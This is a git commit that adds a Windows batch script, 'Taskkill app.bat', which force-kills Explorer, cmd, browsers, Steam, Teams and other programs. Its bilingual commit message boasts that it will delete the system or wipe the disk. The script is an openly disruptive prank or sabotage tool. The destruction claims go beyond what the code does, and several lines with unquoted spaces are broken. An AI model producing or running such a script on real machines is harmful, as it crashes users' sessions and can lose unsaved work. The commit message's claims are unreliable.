90c1af2c372b238e0b2894ea9d875fb47fe40026
Kundel8392 <magda.orzol82@gmail.com>
2024-09-14 14:06:46 +0200

    Create Taskkill app.bat
    Warning!!! the app uninstal system!!!
    Uwaga!!! ten plik zatrzyma i usunie system a jak nie to usunie dysk i wszystkie potrzebne aplikacje

---
+++ Taskkill app.bat
@@ -0,0 +1,17 @@
+@echo off
+taskkill /f /im explorer.exe
+taskkill /f /im firefox.exe
+taskkill /f /im chrome.exe
+taskkill /f /im opera.exe
+taskkill /f /im opera gx.exe
+taskkill /f /im cmd.exe
+taskkill /f /im notepad.exe
+taskkill /f /im calc.exe
+taskkill /f /im charmap.exe
+taskkill /f /im microsoft store.exe
+taskkill /f /im microsoft teams.exe
+taskkill /f /im microsoft edge.exe
+taskkill /f /im steam.exe
+taskkill /f /im epic games.exe
+taskkill /f /im bluestacks.exe
+taskkill /f /im microsoft 365.exe
